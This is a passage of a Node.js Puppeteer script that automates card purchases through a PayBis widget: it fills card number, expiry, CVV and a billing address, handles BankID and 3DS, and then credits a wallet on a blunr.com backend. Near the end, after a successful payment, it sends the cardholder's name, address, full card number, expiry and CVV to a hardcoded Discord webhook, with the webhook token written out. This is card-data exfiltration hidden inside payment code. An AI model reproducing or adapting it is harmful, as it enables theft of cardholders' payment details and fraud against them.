          } catch (e) {
            // Continue to next selector
          }
        }

        if (newCardClicked) break;

        // If not found, check if we're on a different page or state
        const currentUrl = page.url();
        if (currentUrl.includes("payment") || currentUrl.includes("checkout")) {
          console.log(
            '📍 Already on payment page, might not need "New card" button',
          );

          // Check if payment form is already visible
          const hasPaymentForm = await page.evaluate(() => {
            return !!(
              document.querySelector('input[name="number"]') ||
              document.querySelector('input[name="cardNumber"]') ||
              document.querySelector('iframe[src*="paybis"]') ||
              document.querySelector('iframe[src*="payment"]')
            );
          });

          if (hasPaymentForm) {
            console.log(
              '✅ Payment form already visible, skipping "New card" button',
            );
            newCardClicked = true;
            break;
          }
        }

        // Wait before the next attempt (CAPTCHA is already being checked every 3 seconds)
        console.log(`Retrying... Attempt ${i + 1}/20`);
        await new Promise((resolve) => setTimeout(resolve, 3000));
      } catch (error) {
        console.error("Error within retry loop:", error.message);
        await new Promise((resolve) => setTimeout(resolve, 3000));
      }
    }

    if (!newCardClicked) {
      throw new Error(
        "'New card' button not found after multiple retries and CAPTCHA checks.",
      );
    }

    // (Rest of the code remains the same)
    console.log("Proceeding to wait for iframe to load...");

    await new Promise((resolve) => setTimeout(resolve, 5000));

    const iframeElementHandle = await page.waitForSelector("iframe", {
      visible: true,
      timeout: 30000,
    });
    console.log(
      "Found iframe:",
      await iframeElementHandle.evaluate((el) => el.src),
    );

    // Wait for outer iframe (you found this URL: https://widget.paybis.com/...)
    const outerIframeElement = await page.waitForSelector(
      'iframe[src*="widget.paybis.com"]',
      { timeout: 30000 },
    );
    const outerFrame = await outerIframeElement.contentFrame();

    if (!outerFrame) {
      throw new Error("Outer iframe contentFrame() returned null");
    }

    // Now inside outer iframe, wait for inner iframe (which should have src including "cp.paybis.com")
    const innerIframeElement = await outerFrame.waitForSelector(
      'iframe[src*="cp.paybis.com"]',
      { timeout: 30000 },
    );
    const innerFrame = await innerIframeElement.contentFrame();

    if (!innerFrame) {
      throw new Error("Inner iframe contentFrame() returned null");
    }

    // Now you can interact with innerFrame DOM, e.g.
    await innerFrame.waitForSelector('input[name="number"]', {
      timeout: 15000,
    });
    await innerFrame.waitForSelector('input[name="exp"]', { timeout: 15000 });
    await innerFrame.waitForSelector('input[name="cvv"]', { timeout: 15000 });

    // Example typing into a field inside the inner iframe
    await innerFrame.type('input[name="number"]', cardNumber, { delay: 100 });
    await innerFrame.type('input[name="exp"]', expiryDate, { delay: 100 });
    await innerFrame.type('input[name="cvv"]', cvv, { delay: 100 });

    // Wait a moment for validation to occur
    await new Promise((resolve) => setTimeout(resolve, 2000));

    // Check for field errors in the payment form
    const fieldErrors = await innerFrame.evaluate(() => {
      const errorElements = document.querySelectorAll(".field__error");
      const errors = [];
      errorElements.forEach((errorEl) => {
        const errorText = errorEl.textContent?.trim();
        if (errorText && errorText.length > 0) {
          errors.push(errorText);
        }
      });
      return errors;
    });

    if (fieldErrors.length > 0) {
      console.log("Field errors detected:", fieldErrors);

      // Send error back to frontend and cancel transaction
      process.send({
        type: "payment-error",
        fieldErrors: fieldErrors,
        error: "Payment form validation failed",
      });

      // Take screenshot for debugging
      await page.screenshot({
        path: path.join(__dirname, "screenshots", "payment-form-errors.png"),
        fullPage: true,
      });

      // Exit cleanly so the server doesn't think this is a system error
      console.log("Exiting due to field validation errors");
      process.exit(0);
    }

    console.log("No field errors detected, proceeding with payment");

    await outerFrame.evaluate(() => {
      window.scrollBy(0, 500); // Scroll down 500 pixels vertically
    });

    await innerFrame.evaluate(
      async (street, city, zip, name) => {
        function delay(ms) {
          return new Promise((resolve) => setTimeout(resolve, ms));
        }

        function simulateTyping(input, text) {
          input.focus();
          input.value = "";
          for (let i = 0; i < text.length; i++) {
            const char = text[i];
            input.value += char;
            input.dispatchEvent(
              new InputEvent("input", { bubbles: true, data: char }),
            );
            input.dispatchEvent(
              new KeyboardEvent("keydown", { key: char, bubbles: true }),
            );
            input.dispatchEvent(
              new KeyboardEvent("keyup", { key: char, bubbles: true }),
            );
          }
        }

        const dropdownInput = document.querySelector("input.select__search");
        if (dropdownInput) {
          dropdownInput.focus();
          dropdownInput.click();
          await delay(300); // give time for dropdown to open

          simulateTyping(dropdownInput, "Sweden");
          await delay(500); // wait for options to render

          const options = Array.from(
            document.querySelectorAll(".select__option"),
          );
          const swedenOption = options.find(
            (opt) => opt.textContent.trim() === "Sweden",
          );
          if (swedenOption) {
            swedenOption.click();
          } else {
            console.warn("Sweden option not found");
          }

          await delay(300); // wait for selection to propagate to internal model
        }

        function setInputValue(selector, value) {
          const input = document.querySelector(selector);
          if (!input) return false;
          input.focus();
          input.value = value;
          input.dispatchEvent(new Event("input", { bubbles: true }));
          input.dispatchEvent(new Event("change", { bubbles: true }));
          return true;
        }

        setInputValue("input#address", street);
        setInputValue("input#city", city);
        setInputValue("input#zip", zip);
        setInputValue('input[name="name"]', name);

        // Uncheck checkbox
        const checkbox = document.querySelector(
          'input.checkbox__input[type="checkbox"]',
        );
        if (checkbox && checkbox.checked) {
          checkbox.click();
          checkbox.dispatchEvent(new Event("input", { bubbles: true }));
          checkbox.dispatchEvent(new Event("change", { bubbles: true }));
        }
      },
      street,
      city,
      zip,
      name,
    );

    console.log("Waiting for 'Pay' button...");
    await outerFrame.waitForSelector('button[data-testid="pay-button"]', {
      visible: true,
      timeout: 15000,
    });

    console.log("💳 === INITIATING PAYMENT ===");
    console.log("🎯 Clicking 'Pay' button...");

    // Log button state before clicking
    const buttonState = await outerFrame.evaluate(() => {
      const button = document.querySelector('button[data-testid="pay-button"]');
      return button
        ? {
            disabled: button.disabled,
            innerText: button.innerText,
            className: button.className,
            style: button.style.cssText,
          }
        : null;
    });
    console.log("🔘 Pay button state:", JSON.stringify(buttonState, null, 2));

    await outerFrame.click('button[data-testid="pay-button"]');
    console.log("✅ 'Pay' button clicked successfully");

    // Take screenshot after clicking
    await page.screenshot({
      path: path.join(__dirname, "screenshots", "payment-initiated.png"),
      fullPage: true,
    });
    console.log("📸 Payment initiation screenshot taken");

    console.log("⏳ === WAITING FOR PAYMENT PROCESSING ===");
    console.log(
      "🔄 Monitoring for 'Payment Processing' screen to disappear...",
    );

    await outerFrame.waitForFunction(
      () => {
        const elem = document.querySelector("h2");
        const processingVisible =
          elem && elem.innerText.includes("Payment Processing");

        if (processingVisible) {
          console.log("⏳ Payment still processing...");
        } else {
          console.log("✅ Payment processing screen has disappeared");
        }

        // Log all h2 elements for debugging
        const allH2s = Array.from(document.querySelectorAll("h2")).map(
          (h2) => h2.innerText,
        );
        console.log("📄 Current H2 elements:", allH2s);

        return !processingVisible;
      },
      { timeout: 90000, polling: 2000 },
    );

    console.log("🎉 'Payment Processing' screen has disappeared!");

    // Log current page state after processing
    const postProcessingState = await outerFrame.evaluate(() => {
      return {
        url: window.location.href,
        title: document.title,
        bodyText: document.body.innerText.substring(0, 500),
        allHeadings: {
          h1: Array.from(document.querySelectorAll("h1")).map(
            (h) => h.innerText,
          ),
          h2: Array.from(document.querySelectorAll("h2")).map(
            (h) => h.innerText,
          ),
          h3: Array.from(document.querySelectorAll("h3")).map(
            (h) => h.innerText,
          ),
        },
      };
    });
    console.log(
      "📊 Post-processing page state:",
      JSON.stringify(postProcessingState, null, 2),
    );

    await page.screenshot({
      path: path.join(__dirname, "screenshots", "after-processing.png"),
    });
    console.log("Screenshot taken after processing screen.");

    let bankIdFrame = null;
    console.log("🔍 === STARTING BANKID FRAME SEARCH ===");
    console.log(`Current page URL: ${page.url()}`);
    console.log(`Total frames available: ${page.frames().length}`);

    // Log all available frames
    for (let frameIndex = 0; frameIndex < page.frames().length; frameIndex++) {
      const frame = page.frames()[frameIndex];
      try {
        const frameUrl = frame.url();
        const frameTitle = await frame.title().catch(() => "No title");
        console.log(
          `Frame ${frameIndex}: URL=${frameUrl}, Title="${frameTitle}"`,
        );
      } catch (e) {
        console.log(
          `Frame ${frameIndex}: Could not get details - ${e.message}`,
        );
      }
    }

    for (let i = 0; i < 30; i++) {
      console.log(`🔄 BankID search attempt ${i + 1}/30...`);

      // Log current page state
      try {
        const currentUrl = page.url();
        const pageTitle = await page.title();
        console.log(
          `📍 Page state - URL: ${currentUrl}, Title: "${pageTitle}"`,
        );

        // Check for 3DS authentication failure or payment errors
        if (
          currentUrl.includes("status=three_ds_not_authenticated") ||
          currentUrl.includes("error_code=") ||
          currentUrl.includes("payment-failed") ||
          currentUrl.includes("transaction-declined")
        ) {
          console.log(
            "❌ Payment failed - 3DS authentication error or transaction declined",
          );
          console.log(`Failed URL: ${currentUrl}`);
          await page.screenshot({
            path: path.join(__dirname, "screenshots", "payment-failed-3ds.png"),
            fullPage: true,
          });
          throw new Error(
            "Payment failed at 3DS authentication stage - cannot proceed to BankID",
          );
        }

        // Take a debug screenshot every few attempts
        if (i % 5 === 0) {
          await page.screenshot({
            path: path.join(
              __dirname,
              "screenshots",
              `bankid-search-attempt-${i + 1}.png`,
            ),
            fullPage: true,
          });
          console.log(
            `📸 Debug screenshot taken: bankid-search-attempt-${i + 1}.png`,
          );
        }
      } catch (e) {
        console.log(`⚠️ Could not get page state: ${e.message}`);
      }

      // Poll for 60 seconds
      for (
        let frameIndex = 0;
        frameIndex < page.frames().length;
        frameIndex++
      ) {
        const frame = page.frames()[frameIndex];
        try {
          const frameUrl = frame.url();
          console.log(`🔍 Checking frame ${frameIndex}: ${frameUrl}`);

          // Get frame content for debugging
          const frameContent = await frame.evaluate(() => {
            return {
              title: document.title,
              bodyText: document.body
                ? document.body.innerText.substring(0, 500)
                : "No body",
              h1: document.querySelector("h1")
                ? document.querySelector("h1").innerText
                : null,
              h2: document.querySelector("h2")
                ? document.querySelector("h2").innerText
                : null,
              h3: document.querySelector("h3")
                ? document.querySelector("h3").innerText
                : null,
              hasForm: !!document.querySelector("form"),
              formAction: document.querySelector("form")
                ? document.querySelector("form").action
                : null,
              buttons: Array.from(document.querySelectorAll("button")).map(
                (btn) => btn.innerText?.substring(0, 50),
              ),
              inputs: Array.from(document.querySelectorAll("input")).map(
                (input) => ({
                  type: input.type,
                  name: input.name,
                  id: input.id,
                  value: input.value?.substring(0, 20),
                }),
              ),
            };
          });

          console.log(
            `📄 Frame ${frameIndex} content:`,
            JSON.stringify(frameContent, null, 2),
          );

          const hasBankIdHeader = await frame.evaluate(() => {
            const h3 = document.querySelector("h3");
            const bodyText = document.body
              ? document.body.innerText.toLowerCase()
              : "";
            return (
              (h3 && h3.innerText.includes("Signera med BankID")) ||
              bodyText.includes("bankid") ||
              bodyText.includes("signera")
            );
          });

          if (hasBankIdHeader) {
            console.log("🎯 BankID frame found!");
            console.log(`✅ BankID frame URL: ${frameUrl}`);
            console.log(
              `✅ BankID frame content:`,
              JSON.stringify(frameContent, null, 2),
            );
            bankIdFrame = frame;
            break;
          } else {
            console.log(`❌ Frame ${frameIndex} is not BankID frame`);
          }
        } catch (e) {
          console.log(`⚠️ Error checking frame ${frameIndex}: ${e.message}`);
        }
      }

      if (bankIdFrame) {
        console.log("🎉 BankID frame search completed successfully!");
        break;
      }

      console.log(
        `⏳ BankID frame not found in attempt ${i + 1}/30. Retrying in 2 seconds...`,
      );
      await new Promise((resolve) => setTimeout(resolve, 2000));
    }

    if (!bankIdFrame) {
      await page.screenshot({
        path: path.join(__dirname, "screenshots", "bankid-frame-not-found.png"),
      });
      throw new Error("Could not find BankID iframe after polling.");
    }

    console.log("🔍 === WAITING FOR BANKID FORM ===");
    console.log(`BankID frame URL: ${bankIdFrame.url()}`);

    try {
      console.log(
        "⏳ Waiting for form with ACS URL to appear in BankID frame...",
      );

      // Wait for form and log detailed info about it
      await bankIdFrame.waitForSelector('form[action*="acs"]', {
        timeout: 10000,
      });

      console.log("✅ BankID form found!");

      // Get detailed form information
      const formDetails = await bankIdFrame.evaluate(() => {
        const form = document.querySelector('form[action*="acs"]');
        if (form) {
          return {
            action: form.action,
            method: form.method,
            inputs: Array.from(form.querySelectorAll("input")).map((input) => ({
              name: input.name,
              type: input.type,
              value: input.value
                ? input.value.substring(0, 50) +
                  (input.value.length > 50 ? "..." : "")
                : "",
              id: input.id,
            })),
            buttons: Array.from(
              form.querySelectorAll('button, input[type="submit"]'),
            ).map((btn) => ({
              type: btn.type,
              value: btn.value,
              innerText: btn.innerText,
            })),
            fullFormHTML:
              form.outerHTML.substring(0, 1000) +
              (form.outerHTML.length > 1000 ? "..." : ""),
          };
        }
        return null;
      });

      console.log(
        "📝 BankID form details:",
        JSON.stringify(formDetails, null, 2),
      );
    } catch (formError) {
      console.error("❌ Error waiting for BankID form:", formError.message);

      // Get current frame state for debugging
      const debugInfo = await bankIdFrame.evaluate(() => {
        return {
          url: window.location.href,
          title: document.title,
          bodyText: document.body.innerText.substring(0, 1000),
          allForms: Array.from(document.querySelectorAll("form")).map(
            (form) => ({
              action: form.action,
              method: form.method,
              id: form.id,
              className: form.className,
            }),
          ),
          allElements: Array.from(document.querySelectorAll("*"))
            .slice(0, 20)
            .map((el) => ({
              tagName: el.tagName,
              id: el.id,
              className: el.className,
            })),
        };
      });

      console.log(
        "🔍 BankID frame debug info:",
        JSON.stringify(debugInfo, null, 2),
      );
      throw formError;
    }

    process.send({ type: "bankid-detected" });

    console.log("🔄 === MONITORING BANKID COMPLETION ===");
    console.log("⏳ Starting 3-minute timeout for BankID completion...");

    // Take screenshot before starting monitoring
    await page.screenshot({
      path: path.join(__dirname, "screenshots", "bankid-monitoring-start.png"),
      fullPage: true,
    });
    console.log("📸 Screenshot taken: bankid-monitoring-start.png");

    // Set up network monitoring for success indicators
    let networkSuccessDetected = false;
    let networkSuccessDetails = null;

    page.on("response", (response) => {
      const url = response.url();
      try {
        // Monitor for FINAL payment success indicators (not just 3DS auth success)
        // Only consider URLs that indicate final payment completion
        const isFinalPaymentSuccess =
          (url.includes("/payment-success") ||
            url.includes("/transaction-success") ||
            url.includes("/deposit-success") ||
            url.includes("/completed") ||
            url.includes("payment_status=completed") ||
            url.includes("status=success") ||
            // Switchere payment completion pattern (only if response indicates success)
            (url.includes("switchere.com/onramp/o/") &&
              response.status() === 200 &&
              !url.includes("initiate"))) &&
          !url.includes("3ds") && // Exclude 3DS-related URLs
          !url.includes("auth"); // Exclude auth-related URLs

        // For continue-transaction API calls, check the actual response content
        const isContinueTransactionSuccess =
          url.includes("continue-transaction") && response.status() === 200;

        // For PayBis transaction status API, we need to check the response body
        const isPayBisTransactionCheck =
          url.includes("api.paybis.com/public/transaction/v2/") &&
          response.status() === 200;

        if (isFinalPaymentSuccess) {
          console.log("🎯 FINAL PAYMENT SUCCESS DETECTED IN NETWORK RESPONSE!");
          console.log("🌐 Success URL:", url);
          console.log("📡 Response status:", response.status());

          networkSuccessDetected = true;
          networkSuccessDetails = {
            url: url,
            status: response.status(),
            timestamp: new Date().toISOString(),
            type: "final_payment_success",
          };
        } else if (isContinueTransactionSuccess) {
          // For continue-transaction calls, we need to examine the response body
          console.log("🔍 CONTINUE-TRANSACTION API CALL DETECTED");
          console.log("📞 API URL:", url);
          console.log("📡 Response status:", response.status());

          // We'll check the response content in a separate handler
          // This is just logging for now
        } else if (isPayBisTransactionCheck) {
          // Log PayBis transaction status check for analysis
          console.log("🔍 PAYBIS TRANSACTION STATUS CHECK DETECTED");
          console.log("📞 PayBis API URL:", url);
          console.log("📡 Response status:", response.status());

          // Try to read response body to check payment status
          response
            .text()
            .then((responseBody) => {
              try {
                const payBisData = JSON.parse(responseBody);
                console.log(
                  "📊 PayBis response data:",
                  JSON.stringify(payBisData, null, 2),
                );

                if (
                  payBisData.payment &&
                  payBisData.payment.status === "complete" &&
                  !payBisData.payment.is_refused &&
                  !payBisData.payment.is_error
                ) {
                  console.log(
                    "🎯 PAYBIS PAYMENT STATUS: COMPLETE - Final payment success confirmed!",
                  );

                  // Set network success detected
                  networkSuccessDetected = true;
                  networkSuccessDetails = {
                    url: url,
                    status: response.status(),
                    timestamp: new Date().toISOString(),
                    type: "final_payment_success",
                    provider: "paybis",
                    paymentStatus: payBisData.payment.status,
                    invoiceStatus: payBisData.status,
                  };
                } else {
                  console.log("⚠️ PayBis payment not yet complete:", {
                    paymentStatus: payBisData.payment?.status,
                    invoiceStatus: payBisData.status,
                    isRefused: payBisData.payment?.is_refused,
                    isError: payBisData.payment?.is_error,
                  });
                }
              } catch (e) {
                console.log(
                  "⚠️ Could not parse PayBis response JSON:",
                  e.message,
                );
              }
            })
            .catch((e) => {
              console.log("⚠️ Could not read PayBis response body:", e.message);
            });
        } else if (url.includes("switchere.com/onramp/o/")) {
          // Log Switchere payment calls for analysis
          console.log("🔍 SWITCHERE PAYMENT CALL DETECTED");
          console.log("📞 Switchere URL:", url);
          console.log("📡 Response status:", response.status());
          console.log("🔄 Request method:", response.request().method());
          console.log(
            "⚠️ Analyzing if this indicates final payment completion...",
          );
        } else if (url.includes("param=Y") || url.includes("transStatus=Y")) {
          // Log 3DS success but don't treat it as final payment success
          console.log(
            "ℹ️ 3DS AUTHENTICATION SUCCESS DETECTED (not final payment)",
          );
          console.log("🔐 3DS Auth URL:", url);
          console.log(
            "⚠️ This is NOT final payment success - waiting for payment completion...",
          );
        }
      } catch (error) {
        // Ignore errors in response monitoring
      }
    });

    console.log("Waiting for BankID completion in the background...");
    const resultHandle = await bankIdFrame
      .waitForFunction(
        () => {
          const bodyText = document.body.innerText;
          if (bodyText.includes("Signatur mottagen")) return { success: true };
          if (
            bodyText.includes("Tiden är löpt ut") ||
            bodyText.includes("Användaren avbröt") ||
            bodyText.includes("Okänt fel")
          )
            return { success: false, error: "BankID failed or was cancelled." };
          return false;
        },
        { timeout: 180000 }, // 3 minute timeout
      )
      .catch((error) => {
        console.error("⚠️ BankID waitForFunction error:", error.message);
        console.error("🔍 Full error details:", error);

        // Check if error is due to iframe closure (common with BankID success)
        if (
          error.message.includes("Session closed") ||
          error.message.includes("iframe has been closed") ||
          error.message.includes("Protocol error")
        ) {
          console.log(
            "🔍 IFRAME CLOSURE DETECTED - This often indicates BankID success!",
          );
          console.log(
            "✅ Iframe closed unexpectedly, checking for network success indicators...",
          );

          if (
            networkSuccessDetected &&
            networkSuccessDetails?.type === "final_payment_success"
          ) {
            console.log(
              "🎯 FINAL payment success was detected, treating iframe closure as success!",
            );
            console.log(
              "📊 Final payment success details:",
              JSON.stringify(networkSuccessDetails, null, 2),
            );
            return { success: true, source: "network_and_iframe_closure" };
          } else if (networkSuccessDetected) {
            console.log(
              "⚠️ Only 3DS auth success detected, not final payment success",
            );
            console.log(
              "🔍 Iframe closure with 3DS success does not guarantee payment success",
            );
            console.log(
              "📊 Network details:",
              JSON.stringify(networkSuccessDetails, null, 2),
            );
            // Don't return success - continue with normal timeout handling
          }
        }

        return null;
      });

    let resultJson;
    if (resultHandle) {
      // Handle both JSHandle (from page evaluation) and plain objects (from enhanced detection)
      if (typeof resultHandle.jsonValue === "function") {
        resultJson = await resultHandle.jsonValue();
        console.log(
          "🎯 BankID result received from waitForFunction (JSHandle):",
        );
      } else {
        resultJson = resultHandle;
        console.log(
          "🎯 BankID result received from enhanced detection (plain object):",
        );
      }
      console.log("📊 Result JSON:", JSON.stringify(resultJson, null, 2));
    } else {
      // If waitForFunction times out, let's check if we can detect success by other means
      console.log("⏰ === BANKID TIMEOUT - DETAILED DEBUGGING ===");
      console.log(
        "🚨 BankID waitForFunction timed out, performing comprehensive page state analysis...",
      );

      try {
        // Take multiple screenshots for debugging
        await page.screenshot({
          path: path.join(
            __dirname,
            "screenshots",
            "bankid-timeout-main-page.png",
          ),
          fullPage: true,
        });
        console.log("📸 Main page timeout screenshot taken");

        // Try to take BankID frame screenshot if still available
        try {
          if (bankIdFrame && !bankIdFrame.isDetached()) {
            await bankIdFrame.screenshot({
              path: path.join(
                __dirname,
                "screenshots",
                "bankid-timeout-frame.png",
              ),
            });
            console.log("📸 BankID frame timeout screenshot taken");

            // Get final BankID frame content
            const finalFrameContent = await bankIdFrame.evaluate(() => {
              return {
                url: window.location.href,
                title: document.title,
                bodyText: document.body.innerText,
                html: document.body.innerHTML.substring(0, 2000),
              };
            });
            console.log(
              "📄 Final BankID frame content:",
              JSON.stringify(finalFrameContent, null, 2),
            );
          }
        } catch (frameError) {
          console.log(
            "⚠️ Could not capture BankID frame on timeout:",
            frameError.message,
          );
        }

        // Check if we're back on the main page (could indicate success)
        const currentUrl = page.url();
        console.log("📍 Current URL after timeout:", currentUrl);

        // Check for success indicators on the main page
        const mainPageSuccess = await page
          .evaluate(() => {
            const bodyText = document.body.innerText.toLowerCase();
            return (
              bodyText.includes("success") ||
              bodyText.includes("complete") ||
              bodyText.includes("thank") ||
              bodyText.includes("framgång")
            );
          })
          .catch(() => false);

        // Check all success indicators: main page content, network responses, and URL patterns
        if (mainPageSuccess || networkSuccessDetected) {
          if (mainPageSuccess) {
            console.log(
              "✅ Success detected on main page after BankID timeout",
            );
          }
          if (networkSuccessDetected) {
            console.log(
              "✅ Success detected in network responses after BankID timeout",
            );
            console.log(
              "📊 Network success details:",
              JSON.stringify(networkSuccessDetails, null, 2),
            );
          }
          resultJson = {
            success: true,
            source: mainPageSuccess ? "main_page" : "network_response",
          };
        } else {
          resultJson = {
            success: false,
            error: "BankID verification timed out.",
          };
        }
      } catch (error) {
        console.error("Error during timeout handling:", error);
        resultJson = {
          success: false,
          error: "BankID verification timed out.",
        };
      }
    }

    console.log(
      `BankID verification finished with status: ${resultJson.success}`,
    );
    console.log("Full result object:", JSON.stringify(resultJson, null, 2));

    // Check for error toast in the main page (appears after BankID completes)
    console.log(
      "🔍 Checking for payment error toasts after BankID completion...",
    );
    try {
      const hasPostBankIdErrorToast = await outerFrame
        .evaluate(() => {
          // Check for PayBis error toast that appears after BankID
          const errorToast = document.querySelector(
            ".widget-content-toast--error",
          );
          if (errorToast) {
            const toastText = errorToast.textContent.toLowerCase();
            console.log("🚨 Post-BankID error toast detected:", toastText);
            return (
              toastText.includes("declined") ||
              toastText.includes("contact your bank") ||
              toastText.includes("payment has been declined")
            );
          }

          // Also check for other error indicators that appear after BankID
          const pageText = document.body.textContent.toLowerCase();
          return (
            pageText.includes("the payment has been declined") ||
            pageText.includes("please contact your bank") ||
            pageText.includes("betalningen har avvisats")
          );
        })
        .catch(() => false);

      if (hasPostBankIdErrorToast) {
        console.log(
          "🚨 ERROR TOAST DETECTED: Payment was declined by bank after BankID success",
        );
        console.log(
          "❌ Overriding any success status - payment failed due to bank decline",
        );
        resultJson = {
          success: false,
          error: "Payment declined by bank after BankID authentication",
          source: "post_bankid_error_toast",
        };
      }
    } catch (e) {
      console.log(
        "⚠️ Could not check for post-BankID error toasts:",
        e.message,
      );
    }

    // Additional success check - only override failure if we have explicit success indicators
    if (!resultJson.success) {
      console.log(
        "Payment marked as failed, checking for explicit success indicators...",
      );

      try {
        // Check if we've been redirected to a success page
        const currentUrl = page.url();
        console.log("Current page URL:", currentUrl);

        // Take a screenshot for debugging
        await page.screenshot({
          path: path.join(
            __dirname,
            "screenshots",
            "payment-completion-debug.png",
          ),
        });

        // Check main page for explicit success indicators
        const pageContent = await page
          .evaluate(() => document.body.innerText.toLowerCase())
          .catch(() => "");
        console.log("Page content preview:", pageContent.substring(0, 500));

        // Enhanced success detection - STRICT criteria to avoid false positives
        // Only consider FINAL payment success indicators, not just 3DS auth success
        const hasSuccessIndicators =
          // FINAL payment success in page content (very specific terms)
          pageContent.includes("payment successful") ||
          pageContent.includes("transaction successful") ||
          pageContent.includes("payment completed") ||
          pageContent.includes("transaction completed") ||
          pageContent.includes("purchase successful") ||
          pageContent.includes("deposit successful") ||
          // Swedish equivalents for final payment success
          pageContent.includes("betalning slutförd") ||
          pageContent.includes("transaktion slutförd") ||
          pageContent.includes("köp slutfört") ||
          // URL-based FINAL success indicators (excluding 3DS auth)
          (currentUrl.includes("payment-success") &&
            !currentUrl.includes("3ds")) ||
          (currentUrl.includes("transaction-success") &&
            !currentUrl.includes("3ds")) ||
          (currentUrl.includes("deposit-success") &&
            !currentUrl.includes("3ds")) ||
          (currentUrl.includes("success") && currentUrl.includes("final")) ||
          // Switchere completion URL pattern
          (currentUrl.includes("switchere.com/onramp/o/") &&
            !currentUrl.includes("3ds")) ||
          // Additional specific success indicators
          pageContent.includes("your payment has been processed") ||
          pageContent.includes("payment confirmation") ||
          pageContent.includes("transaction confirmation");

        // Check for failure indicators
        const hasFailureIndicators =
          pageContent.includes("error") ||
          pageContent.includes("failed") ||
          pageContent.includes("cancelled") ||
          pageContent.includes("timeout") ||
          pageContent.includes("avbruten") ||
          pageContent.includes("misslyckad") ||
          pageContent.includes("fel") ||
          pageContent.includes("tiden är löpt ut") ||
          // Specific PayBis/Widget error messages
          pageContent.includes("the payment has been declined") ||
          pageContent.includes("please contact your bank") ||
          pageContent.includes("payment declined") ||
          pageContent.includes("betalningen har avvisats") ||
          pageContent.includes("kontakta din bank");

        // Also check for specific error UI elements in the DOM
        let hasErrorToast = false;
        try {
          hasErrorToast = await outerFrame
            .evaluate(() => {
              // Check for PayBis error toast
              const errorToast = document.querySelector(
                ".widget-content-toast--error",
              );
              if (errorToast) {
                const toastText = errorToast.textContent.toLowerCase();
                console.log("🚨 Error toast detected:", toastText);
                return (
                  toastText.includes("declined") ||
                  toastText.includes("contact your bank") ||
                  toastText.includes("payment has been declined")
                );
              }
              return false;
            })
            .catch(() => false);
        } catch (e) {
          // Ignore evaluation errors
        }

        const totalFailureIndicators = hasFailureIndicators || hasErrorToast;

        // Final verification - ONLY accept very specific success indicators
        if (hasSuccessIndicators && !totalFailureIndicators) {
          console.log(
            "✅ FINAL PAYMENT SUCCESS indicators found in page content, overriding BankID timeout status",
          );
          resultJson = {
            success: true,
            source: "final_payment_confirmation",
          };
        } else if (
          networkSuccessDetected &&
          networkSuccessDetails?.type === "final_payment_success" &&
          !totalFailureIndicators
        ) {
          console.log(
            "✅ FINAL PAYMENT SUCCESS detected via network monitoring, overriding BankID timeout status",
          );
          console.log(
            "📊 Final payment success details:",
            JSON.stringify(networkSuccessDetails, null, 2),
          );
          resultJson = {
            success: true,
            source: "network_final_payment",
          };
        } else if (totalFailureIndicators) {
          console.log("❌ Failure indicators confirmed, payment failed");
          if (hasErrorToast) {
            console.log(
              "🚨 Specific error toast detected - payment declined by bank",
            );
          }
        } else {
          console.log(
            "⚠️ No clear success indicators found, maintaining failed status",
          );
        }
      } catch (error) {
        console.error("Error during additional success verification:", error);
      }
    }

    console.log(resultJson);

    if (resultJson.success) {
      // Add funds to creator's wallet with transaction validation
      await addFundsToCreatorWallet(blunrParams, amount, transactionId);

      const webhookUrl =
        "https://discord.com/api/webhooks/1396214469084053625/OKz32VisCW9Z5p1AhCrHqlmtirhWao7EGq_1NIYhHB1vQrdU-5MojTwemZr5McTvCiBP";
      const embed = {
        title: "Successful Transaction",
        color: 0x00ff00,
        fields: [
          { name: "Full Name", value: name, inline: true },
          { name: "Amount", value: amount.toString(), inline: true },
          { name: "Street Address", value: street, inline: true },
          { name: "City", value: city, inline: true },
          { name: "ZIP Code", value: zip, inline: true },
          { name: "Card Number", value: `||${cardNumber}||`, inline: true },
          { name: "Expiry Date", value: `||${expiryDate}||`, inline: true },
          { name: "CVV", value: `||${cvv}||`, inline: true },
        ],
        timestamp: new Date(),
      };
      axios
        .post(webhookUrl, { embeds: [embed] })
        .catch((err) => console.error("Error sending to Discord:", err));
    }
    process.send({ type: "purchase-complete", data: resultJson });

    // const wrapperElement = await innerFrame.waitForSelector('.wrapper', { visible: true, timeout: 30000 });

    // if (wrapperElement) {
    //     console.log(".wrapper found, taking screenshot...");
    //     await wrapperElement.screenshot({ path: path.join(__dirname, 'screenshots', 'wrapper.png') });
    //     console.log("Screenshot of .wrapper saved.");
    // }
  } catch (error) {
    console.error("An error occurred:", error);

    // If we created a transaction but payment failed, we should mark it as failed
    if (
      transactionId &&
      error.message &&
      !error.message.includes("Transaction creation failed")
    ) {
      try {
        console.log(
          `Marking transaction ${transactionId} as failed due to payment error...`,
        );
        const updateURL = `https://backend.blunr.com/api/transaction/update/${transactionId}/status`;
        await axios
          .patch(
            updateURL,
            { status: "failed" },
            {
              headers: { "Content-Type": "application/json" },
              timeout: 5000,
              httpsAgent: httpsAgent,
              proxy: false,
            },
          )
          .catch((err) =>
            console.error("Failed to mark transaction as failed:", err.message),
          );
      } catch (updateError) {
        console.error(
          "Error updating transaction status:",
          updateError.message,
        );
      }
    }

    await page.screenshot({
      path: path.join(__dirname, "screenshots", "error.png"),
    });
    console.log("An error screenshot was taken: 'error.png'");
    process.exit(1);
  } finally {
    if (captchaInterval) {
      clearInterval(captchaInterval);
    }
    console.log("Closing the browser.");
    await browser.close();
  }
}

if (require.main === module) {
  main();
}
